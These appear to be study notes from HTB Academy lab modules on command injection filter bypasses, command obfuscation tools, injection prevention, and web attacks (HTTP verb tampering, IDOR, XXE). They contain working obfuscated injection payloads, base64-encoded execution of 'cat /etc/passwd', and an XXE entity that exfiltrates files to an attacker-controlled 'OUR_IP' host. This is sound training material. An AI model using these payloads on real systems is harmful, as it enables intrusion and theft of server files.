	> Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (127.0.0.1%0a%09) and see if our request is accepted: Filter Space
	> As we can see, we successfully bypassed the space character filter by using a tab instead. Let us see another method of replacing space characters.

* Using $IFS
	> Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use ${IFS} where the spaces should be, the variable should be automatically replaced with a space, and our command should work.
	> Let us use ${IFS} and see if it works (127.0.0.1%0a${IFS}): Filter Space
	> We see that our request was not denied this time, and we bypassed the space filter again.

* Using Brace Expansion
	> There are many other methods we can utilize to bypass space filters. For example, we can use the Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces, as follows:
	> Using Brace Expansion
		m1l0js@htb[/htb]$ {ls,-la}
		
		total 0
		drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
		drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..

	> As we can see, the command was successfully executed without having spaces in it. We can utilize the same method in command injection filter bypasses, by using brace expansion on our command arguments, like (127.0.0.1%0a{ls,-la}). To discover more space filter bypasses, check out the PayloadsAllTheThings(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.


-=-=-=
[+] Bypassing Other Blacklisted Characters
	> Besides injection operators and space characters, a very commonly blacklisted character is the slash (/) or backslash (\) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

* Linux
	> There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (or any other character) is through Linux Environment Variables like we did with ${IFS}. While ${IFS} is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify start and length of our string to exactly match this character.
	> For example, if we look at the $PATH environment variable in Linux, it may look something like the following:
		m1l0js@htb[/htb]$ echo ${PATH}
		/usr/local/bin:/usr/bin:/bin:/usr/games

	> So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / character, which we can use in our payload:
		m1l0js@htb[/htb]$ echo ${PATH:0:1}
		/

	> Note: When we use the above command in our payload, we will not add echo, as we are only using it in this case to show the outputted character.
	> We can do the same with the $HOME or $PWD environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:
		m1l0js@htb[/htb]$ echo ${LS_COLORS:10:1}
		;

	> Exercise: Try to understand how the above command resulted in a semi-colon, and then use it in the payload to use it as an injection operator. Hint: The printenv command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.
	> So, let's try to use environment variables to add a semi-colon and a space to our payload (127.0.0.1${LS_COLORS:10:1}${IFS}) as our payload, and see if we can bypass the filter: Filter Operator
	> As we can see, we successfully bypassed the character filter this time as well.

* Windows
	> The same concept work on Windows as well. For example, to produce a slash in Windows Command Line (CMD), we can echo a Windows variable (%HOMEPATH% -> \Users\htb-student), and then specify a starting position (~6 -> \htb-student), and finally specifying a negative end position, which in this case is the length of the username htb-student (-11 -> \) :
		C:\htb> echo %HOMEPATH:~6,-11%
		\

	> We can achieve the same thing using the same variables in Windows PowerShell. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:
		PS C:\htb> $env:HOMEPATH[0]
		\

		PS C:\htb> $env:PROGRAMFILES[10]
		PS C:\htb>

	> We can also use the Get-ChildItem Env: PowerShell command to print all environment variables and then pick one of them to produce a character we need. Try to be creative and find different commands to produce similar characters.

* Character Shifting
	> There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with man ascii), then add it instead of [ in the below example. This way, the last printed character would be the one we need:

		m1l0js@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
		m1l0js@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
		\

	> We can use PowerShell commands to achieve the same result in Windows, though they can be quite longer than the Linux ones.

	> Exercise: Try to use the the character shifting technique to produce a semi-colon ; character. First find the character before it in the ascii table, and then use it in the above command.


-=-=
[+] Bypassing Blacklisted Commands
	> We have discussed various methods for bypassing single-character filters. However, there are different methods when it comes to bypassing blacklisted commands. A command blacklist usually consists of a set of words, and if we can obfuscate our commands and make them look different, we may be able to bypass the filters.
	> There are various methods of command obfuscation that vary in complexity, as we will touch upon later with command obfuscation tools. We will cover a few basic techniques that may enable us to change the look of our command to bypass filters manually.

* Commands Blacklist
	> We have so far successfully bypassed the character filter for the space and semi-colon characters in our payload. So, let us go back to our very first payload and re-add the whoami command to see if it gets executed: Filter Commands
We see that even though we used characters that are not blocked by the web application, the request gets blocked again once we added our command. This is likely due to another type of filter, which is a command blacklist filter.
	> A basic command blacklist filter in PHP would look like the following:
		Code: php
		
		$blacklist = ['whoami', 'cat', ...SNIP...];
		foreach ($blacklist as $word) {
		    if (strpos('$_POST['ip']', $word) !== false) {
		        echo "Invalid input";
		    }
		}

	> As we can see, it is checking each word of the user input to see if it matches any of the blacklisted words. However, this code is looking for an exact match of the provided command, so if we send a slightly different command, it may not get blocked. Luckily, we can utilize various obfuscation techniques that will execute our command without using the exact command word.

* Linux & Windows
	> One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote ' and a double-quote ", in addition to a few others.
	> The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the whoami command, we can insert single quotes between its characters, as follows:
		21y4d@htb[/htb]$ w'h'o'am'i
		21y4d
	> The same works with double-quotes as well:
		21y4d@htb[/htb]$ w"h"o"am"i
		21y4d

	> The important things to remember are that we cannot mix types of quotes and the number of quotes must be even. We can try one of the above in our payload (127.0.0.1%0aw'h'o'am'i) and see if it works:
	> As we can see, this method indeed works.

* Linux Only
	> We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command. These characters include the backslash \ and the positional parameter character $@. This works exactly as it did with the quotes, but in this case, the number of characters do not have to be even, and we can insert just one of them if we want to:
		Code: bash
		who$@ami
		w\ho\am\i

	> Exercise: Try the above two examples in your payload, and see if they work in bypassing the command filter. If they do not, this may indicate that you may have used a filtered character. Would you be able to bypass that as well, using the techniques we learned in the previous section?

* Windows Only
	> There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (^) character, as we can see in the following example:
		C:\htb> who^ami
		21y4d

* In the next section, we will discuss some more advanced techniques for command obfuscation and filter bypassing.
	ip=127.0.0.1%0ac$@at${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt


-=-=-=-==
[+] Advanced Command Obfuscation

	> In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.

* Case Manipulation
	> One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. WHOAMI) or alternating between cases (e.g. WhOaMi). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.
	> If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in:

		PS C:\htb> WhOaMi
		21y4d

	> However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:
		21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
		21y4d
	> As we can see, the command did work, even though the word we provided was (WhOaMi). This command uses tr to replace all upper-case characters with lower-case characters, which results in an all lower-case character command. However, if we try to use the above command with the Host Checker web application, we will see that it still gets blocked:

	> Can you guess why? It is because the command above contains spaces, which is a filtered character in our web application, as we have seen before. So, with such techniques, we must always be sure not to use any filtered characters, otherwise our requests will fail, and we may think the techniques failed to work.
	> Once we replace the spaces with tabs (%09), we see that the command works perfectly:
	> There are many other commands we may use for the same purpose, like the following:
		Code: bash
		$(a="WhOaMi";printf %s "${a,,}")

	> Exercise: Can you test the above command to see if it works on your Linux VM, and then try to avoid using filtered characters to get it working on the web application?

* Reversed Commands
	> Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing imaohw instead of whoami to avoid triggering the blacklisted command.
	> We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we'd have to get the reversed string of our command in our terminal, as follows:
		m1l0js@htb[/htb]$ echo 'whoami' | rev
		imaohw

	> Then, we can execute the original command by reversing it back in a sub-shell ($()), as follows:
		21y4d@htb[/htb]$ $(rev<<<'imaohw')
		21y4d

	> We see that even though the command does not contain the actual whoami word, it does work the same and provides the expected output. We can also test this command with our exercise, and it indeed works:
	> Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.

	> The same can be applied in Windows. We can first reverse a string, as follows:
		PS C:\htb> "whoami"[-1..-20] -join ''
		imaohw

	> We can now use the below command to execute a reversed string with a PowerShell sub-shell (iex "$()"), as follows:
		PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
		21y4d

* Encoded Commands
	> The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.
	> We can utilize various encoding tools, like base64 (for b64 encoding) or xxd (for hex encoding). Let's take base64 as an example. First, we'll encode the payload we want to execute (which includes filtered characters):
		m1l0js@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
		Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

	> Now we can create a command that will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed (i.e. bash<<<), as follows:
		m1l0js@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

	> As we can see, the above command executes the command perfectly. We did not include any filtered characters and avoided encoded characters that may lead the command to fail to execute.
	> Tip: Note that we are using <<< to avoid using a pipe |, which is a filtered character.
	> Now we can use this command (once we replace the spaces) to execute the same command through command injection:
		(https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_6.jpg)
	> Even if some commands were filtered, like bash or base64, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like sh for command execution and openssl for b64 decoding, or xxd for hex decoding.


	> We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:
		PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
		dwBoAG8AYQBtAGkA

	> We may also achieve the same thing on Linux, but we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:
		m1l0js@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
		dwBoAG8AYQBtAGkA

	> Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (ies "$()"), as follows:
		PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
		21y4d

* As we can see, we can get creative with Bash or PowerShell and create new bypassing and obfuscation methods that have not been used before, and hence are very likely to bypass filters and WAFs. Several tools can help us automatically obfuscate our commands, which we will discuss in the next section.

* In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)


-=-=
[+] Evasion Tools
	> If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools. This section will discuss a couple of examples of these types of tools, one for Linux and another for Windows.

* Linux (Bashfuscator)
	> A handy tool we can utilize for obfuscating bash commands is Bashfuscator(https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:
		m1l0js@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
		m1l0js@htb[/htb]$ cd Bashfuscator
		m1l0js@htb[/htb]$ python3 setup.py install --user

	> Once we have the tool set up, we can start using it from the ./bashfuscator/bin/ directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the -h help menu:
		m1l0js@htb[/htb]$ cd ./bashfuscator/bin/
		m1l0js@htb[/htb]$ ./bashfuscator -h

	> We can start by simply providing the command we want to obfuscate with the -c flag:
		m1l0js@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
		[+] Mutators used: Token/ForCode -> Command/Reverse
		[+] Payload:
		 ${*/+27\[X\(} ...SNIP...  ${*~}   
		[+] Payload size: 1664 characters

	> However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:
		m1l0js@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
		
		[+] Mutators used: Token/ForCode
		[+] Payload:
		eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
		[+] Payload size: 104 characters

	> We can now test the outputted command with bash -c '', to see whether it does execute the intended command:
		m1l0js@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
		root:x:0:0:root:/root:/bin/bash
		...SNIP...

	> We can see that the obfuscated command works, all while looking completely obfuscated, and does not resemble our original command. We may also notice that the tool utilizes many obfuscation techniques, including the ones we previously discussed and many others.
	> Exercise: Try testing the above command with our web application, to see if it can successfully bypass the filters. If it does not, can you guess why? And can you make the tool produce a working payload?

* Windows (DOSfuscation)
	> There is also a very similar tool that we can use for Windows called DOSfuscation(https://github.com/danielbohannon/Invoke-DOSfuscation). Unlike Bashfuscator, this is an interactive tool, as we run it once and interact with it to get the desired obfuscated command. We can once again clone the tool from GitHub and then invoke it through PowerShell, as follows:

		PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
		PS C:\htb> cd Invoke-DOSfuscation
		PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
		PS C:\htb> Invoke-DOSfuscation
		Invoke-DOSfuscation> help

	> We can even use tutorial to see an example of how the tool works. Once we are set, we can start using the tool, as follows:
		Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
		Invoke-DOSfuscation> encoding
		Invoke-DOSfuscation\Encoding> 1

		...SNIP...
		Result:
		typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
	
	> Finally, we can try running the obfuscated command on CMD, and we see that it indeed works as expected:

		C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
		test_flag

* Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through pwsh. Run pwsh, and then follow the exact same command from above. This tool is installed by default in your `Pwnbox` instance. You can also find installation instructions at this link => (https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux)

* For more on advanced obfuscation methods, you may refer to the Secure Coding 101: JavaScript module, which covers advanced obfuscations methods that can be utilized in various attacks, including the ones we covered in this module.

-=-=
[+] Command Injection Prevention
	> We should now have a solid understanding of how command injection vulnerabilities occur and how certain mitigations like character and command filters may be bypassed. This section will discuss methods we can use to prevent command injection vulnerabilities in our web applications and properly configure the webserver to prevent them.

* System Commands
	> We should always avoid using functions that execute system commands, especially if we are using user input with them. Even when we are not directly inputting user input into these functions, a user may be able to indirectly influence them, which may eventually lead to a command injection vulnerability.
	> Instead of using system command execution functions, we should use built-in functions that perform the needed functionality, as back-end languages usually have secure implementations of these types of functionalities. For example, suppose we wanted to test whether a particular host is alive with PHP. In that case, we may use the fsockopen function instead, which should not be exploitable to execute arbitrary system commands.
	> If we needed to execute a system command, and no built-in function can be found to perform the same functionality, we should never directly use the user input with these functions but should always validate and sanitize the user input on the back-end. Furthermore, we should try to limit our use of these types of functions as much as possible and only use them when there's no built-in alternative to the functionality we require.

* Input Validation
	> Whether using built-in functions or system command execution functions, we should always validate and then sanitize the user input. Input validation is done to ensure it matches the expected format for the input, such that the request is denied if it does not match. In our example web application, we saw that there was an attempt at input validation on the front-end, but input validation should be done both on the front-end and on the back-end.
	> In PHP, like many other web development languages, there are built in filters for a variety of standard formats, like emails, URLs, and even IPs, which can be used with the filter_var function, as follows:
		Code: php
		
		if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
		    // call function
		} else {
		    // deny request
		}

	> If we wanted to validate a different non-standard format, then we can use a Regular Expression regex with the preg_match function. The same can be achieved with JavaScript for both the front-end and back-end (i.e. NodeJS), as follows:
		Code: javascript
		
		if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
		    // call function
		}
		else{
		    // deny request
		}

	> Just like PHP, with NodeJS, we can also use libraries to validate various standard formats, like is-ip(https://www.npmjs.com/package/is-ip) for example, which we can install with npm, and then use the isIp(ip) function in our code. You can read the manuals of other languages, like .NET(https://learn.microsoft.com/en-us/aspnet/web-pages/overview/ui-layouts-and-themes/validating-user-input-in-aspnet-web-pages-sites) or Java(https://docs.oracle.com/cd/E13226_01/workshop/docs81/doc/en/workshop/guide/netui/guide/conValidatingUserInput.html?skipReload=true), to find out how to validate user input on each respective language.

* Input Sanitization
	> The most critical part for preventing any injection vulnerability is input sanitization, which means removing any non-necessary special characters from the user input. Input sanitization is always performed after input validation. Even after we validated that the provided user input is in the proper format, we should still perform sanitization and remove any special characters not required for the specific format, as there are cases where input validation may fail (e.g., a bad regex).
	> In our example code, we saw that when we were dealing with character and command filters, it was blacklisting certain words and looking for them in the user input. Generally, this is not a good enough approach to preventing injections, and we should use built-in functions to remove any special characters. We can use preg_replace to remove any special characters from the user input, as follows:
		Code: php
		$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);

	> As we can see, the above regex only allows alphanumerical characters (A-Za-z0-9) and allows a dot character (.) as required for IPs. Any other characters will be removed from the string. The same can be done with JavaScript, as follows:
		Code: javascript
		var ip = ip.replace(/[^A-Za-z0-9.]/g, '');

	> We can also use the DOMPurify library for a NodeJS back-end, as follows:
		Code: javascript
		import DOMPurify from 'dompurify';
		var ip = DOMPurify.sanitize(ip);

	> In certain cases, we may want to allow all special characters (e.g., user comments), then we can use the same filter_var function we used with input validation, and use the escapeshellcmd filter to escape any special characters, so they cannot cause any injections. For NodeJS, we can simply use the escape(ip) function. However, as we have seen in this module, escaping special characters is usually not considered a secure practice, as it can often be bypassed through various techniques.
	> For more on user input validation and sanitization to prevent command injections, you may refer to the Secure Coding 101: JavaScript module, which covers how to audit the source code of a web application to identify command injection vulnerabilities, and then works on properly patching these types of vulnerabilities.

* Server Configuration
	> Finally, we should make sure that our back-end server is securely configured to reduce the impact in the event that the webserver is compromised. Some of the configurations we may implement are:
    		- Use the web server's built-in Web Application Firewall (e.g., in Apache mod_security), in addition to an external WAF (e.g. Cloudflare, Fortinet, Imperva..)
    		- Abide by the Principle of Least Privilege (PoLP) by running the web server as a low privileged user (e.g. www-data)
    		- Prevent certain functions from being executed by the web server (e.g., in PHP disable_functions=system,...)
    		- Limit the scope accessible by the web application to its folder (e.g. in PHP open_basedir = '/var/www/html')
    		- Reject double-encoded requests and non-ASCII characters in URLs
    		- Avoid the use of sensitive/outdated libraries and modules (e.g. PHP CGI => https://www.php.net/manual/en/install.unix.commandline.php)

* In the end, even after all of these security mitigations and configurations, we have to perform the penetration testing techniques we learned in this module to see if any web application functionality may still be vulnerable to command injection. As some web applications have millions of lines of code, any single mistake in any line of code may be enough to introduce a vulnerability. So we must try to secure the web application by complementing secure coding best practices with thorough penetration testing.

-=-=-=-=-==-
###Web Attacks


## HTTP Verb Tampering

`HTTP Method`
- `HEAD`
- `PUT`
- `DELETE`
- `OPTIONS`
- `PATCH`

| **Command**   | **Description**   |
| --------------|-------------------|
| `-X OPTIONS` | Set HTTP Method with Curl |

## IDOR

`Identify IDORS`
- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

| **Command**   | **Description**   |
| --------------|-------------------|
| `md5sum` | MD5 hash a string |
| `base64` | Base64 encode a string |

## XXE

| **Code**   | **Description**   |
| --------------|-------------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |

* Introduction to Web Attacks
	> As web applications are becoming very common and being utilized for most businesses, the importance of protecting them against malicious attacks also becomes more critical. As modern web applications become more complex and advanced, so do the types of attacks utilized against them. This leads to a vast attack surface for most businesses today, which is why web attacks are the most common types of attacks against companies. Protecting web applications is becoming one of the top priorities for any IT department.
	> Attacking external-facing web applications may result in compromise of the businesses' internal network, which may eventually lead to stolen assets or disrupted services. It may potentially cause a financial disaster for the company. Even if a company has no external facing web applications, they likely utilize internal web applications, or external facing API endpoints, both of which are vulnerable to the same types of attacks and can be leveraged to achieve the same goals.
	> While other HTB Academy modules covered various topics about web applications and various types of web exploitation techniques, in this module, we will cover three other web attacks that can be found in any web application, which may lead to compromise. We will discuss how to detect, exploit, and prevent each of these three attacks.
Web Attacks

* HTTP Verb Tampering
	> The first web attack discussed in this module is HTTP Verb Tampering(https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering). An HTTP Verb Tampering attack exploits web servers that accept many HTTP verbs and methods. This can be exploited by sending malicious requests using unexpected methods, which may lead to bypassing the web application's authorization mechanism or even bypassing its security controls against other web attacks. HTTP Verb Tampering attacks are one of many other HTTP attacks that can be used to exploit web server configurations by sending malicious HTTP requests.

* Insecure Direct Object References (IDOR)
	> The second attack discussed in this module is Insecure Direct Object References (IDOR) ==> (https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References). IDOR is among the most common web vulnerabilities and can lead to accessing data that should not be accessible by attackers. What makes this attack very common is essentially the lack of a solid access control system on the back-end. As web applications store users' files and information, they may use sequential numbers or user IDs to identify each item. Suppose the web application lacks a robust access control mechanism and exposes direct references to files and resources. In that case, we may access other users' files and information by simply guessing or calculating their file IDs.

* XML External Entity (XXE) Injection
	> The third and final web attack we will discuss is XML External Entity (XXE) Injection ==> (https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing). Many web applications process XML data as part of their functionality. Suppose a web application utilizes outdated XML libraries to parse and process XML input data from the front-end user. In that case, it may be possible to send malicious XML data to disclose local files stored on the back-end server. These files may be configuration files that may contain sensitive information like passwords or even the source code of the web application, which would enable us to perform a Whitebox Penetration Test on the web application to identify more vulnerabilities. XXE attacks can even be leveraged to steal the hosting server's credentials, which would compromise the entire server and allow for remote code execution.

--=
[+] Intro to HTTP Verb Tampering
	> The HTTP protocol works by accepting various HTTP methods as verbs at the beginning of an HTTP request. Depending on the web server configuration, web applications may be scripted to accept certain HTTP methods for their various functionalities and perform a particular action based on the type of the request.
	> While programmers mainly consider the two most commonly used HTTP methods, GET and POST, any client can send any other methods in their HTTP requests and then see how the web server handles these methods. Suppose both the web application and the back-end web server are configured only to accept GET and POST requests. In that case, sending a different request will cause a web server error page to be displayed, which is not a severe vulnerability in itself (other than providing a bad user experience and potentially leading to information disclosure). On the other hand, if the web server configurations are not restricted to only accept the HTTP methods required by the web server (e.g. GET/POST), and the web application is not developed to handle other types of HTTP requests (e.g. HEAD, PUT), then we may be able to exploit this insecure configuration to gain access to functionalities we do not have access to, or even bypass certain security controls.

* HTTP Verb Tampering
	> To understand HTTP Verb Tampering, we must first learn about the different methods accepted by the HTTP protocol. HTTP has 9 different verbs(https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) that can be accepted as HTTP methods by web servers. Other than GET and POST, the following are some of the commonly used HTTP verbs:
	> Verb 			Description
		HEAD 		Identical to a GET request, but its response only contains the headers, without the response body
		PUT 		Writes the request payload to the specified location
		DELETE 		Deletes the resource at the specified location
		OPTIONS 	Shows different options accepted by a web server, like accepted HTTP verbs
		PATCH 		Apply partial modifications to the resource at the specified location

	> As you can imagine, some of the above methods can perform very sensitive functionalities, like writing (PUT) or deleting (DELETE) files to the webroot directory on the back-end server. As discussed in the Web Requests module, if a web server is not securely configured to manage these methods, we can use them to gain control over the back-end server. However, what makes HTTP Verb Tampering attacks more common (and hence more critical), is that they are caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability.

* Insecure Configurations
	> Insecure web server configurations cause the first type of HTTP Verb Tampering vulnerabilities. A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. For example, a system admin may use the following configuration to require authentication on a particular web page:
		Code: xml
		
		<Limit GET POST>
		    Require valid-user
		</Limit>

	> As we can see, even though the configuration specifies both GET and POST requests for the authentication method, an attacker may still use a different HTTP method (like HEAD) to bypass this authentication mechanism altogether, as will see in the next section. This eventually leads to an authentication bypass and allows attackers to access web pages and domains they should not have access to.

* Insecure Coding
	> Insecure coding practices cause the other type of HTTP Verb Tampering vulnerabilities (though some may not consider this Verb Tampering). This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters:
		Code: php
		
		$pattern = "/^[A-Za-z\s]+$/";
		
		if(preg_match($pattern, $_GET["code"])) {
		    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
		    ...SNIP...
		}

	> We can see that the sanitization filter is only being tested on the GET parameter. If the GET requests do not contain any bad characters, then the query would be executed. However, when the query is executed, the $_REQUEST["code"] parameters are being used, which may also contain POST parameters, leading to an inconsistency in the use of HTTP Verbs. In this case, an attacker may use a POST request to perform SQL injection, in which case the GET parameters would be empty (will not include any bad characters). The request would pass the security filter, which would make the function still vulnerable to SQL Injection.

* While both of the above vulnerabilities are found in public, the second one is much more common, as it is due to mistakes made in coding, while the first is usually avoided by secure web server configurations, as documentation often cautions against it. In the coming sections, we will see examples of both types and how to exploit them.

-=-=
[+] Bypassing Basic Authentication

	> Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application. While many automated vulnerability scanning tools can consistently identify HTTP Verb Tampering vulnerabilities caused by insecure server configurations, they usually miss identifying HTTP Tampering vulnerabilities caused by insecure coding. This is because the first type can be easily identified once we bypass an authentication page, while the other needs active testing to see whether we can bypass the security filters in place.
	> The first type of HTTP Verb Tampering vulnerability is mainly caused by Insecure Web Server Configurations, and exploiting this vulnerability can allow us to bypass the HTTP Basic Authentication prompt on certain pages.

* Identify
	> When we start the exercise at the end of this section, we see that we have a basic File Manager web application, in which we can add new files by typing their names and hitting enter:
	> However, suppose we try to delete all files by clicking on the red Reset button. In that case, we see that this functionality seems to be restricted for authenticated users only, as we get the following HTTP Basic Auth prompt:
	> As we do not have any credentials, we will get a 401 Unauthorized page:
	> So, let's see whether we can bypass this with an HTTP Verb Tampering attack. To do so, we need to identify which pages are restricted by this authentication. If we examine the HTTP request after clicking the Reset button or look at the URL that the button navigates to after clicking it, we see that it is at /admin/reset.php. So, either the /admin directory is restricted to authenticated users only, or only the /admin/reset.php page is. We can confirm this by visiting the /admin directory, and we do indeed get prompted to log in again. This means that the full /admin directory is restricted.

* Exploit
	> To try and exploit the page, we need to identify the HTTP request method used by the web application. We can intercept the request in Burp Suite and examine it: unauthorized_request
	> As the page uses a GET request, we can send a POST request and see whether the web page allows POST requests (i.e., whether the Authentication covers POST requests). To do so, we can right-click on the intercepted request in Burp and select Change Request Method, and it will automatically change the request into a POST request: change_request
	> Once we do so, we can click Forward and examine the page in our browser. Unfortunately, we still get prompted to log in and will get a 401 Unauthorized page if we don't provide the credentials:
	> So, it seems like the web server configurations do cover both GET and POST requests. However, as we have previously learned, we can utilize many other HTTP methods, most notably the HEAD method, which is identical to a GET request but does not return the body in the HTTP response. If this is successful, we may not receive any output, but the reset function should still get executed, which is our main target.
	> To see whether the server accepts HEAD requests, we can send an OPTIONS request to it and see what HTTP methods are accepted, as follows:

		m1l0js@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/
		
		HTTP/1.1 200 OK
		Date: 
		Server: Apache/2.4.41 (Ubuntu)
		Allow: POST,OPTIONS,HEAD,GET
		Content-Length: 0
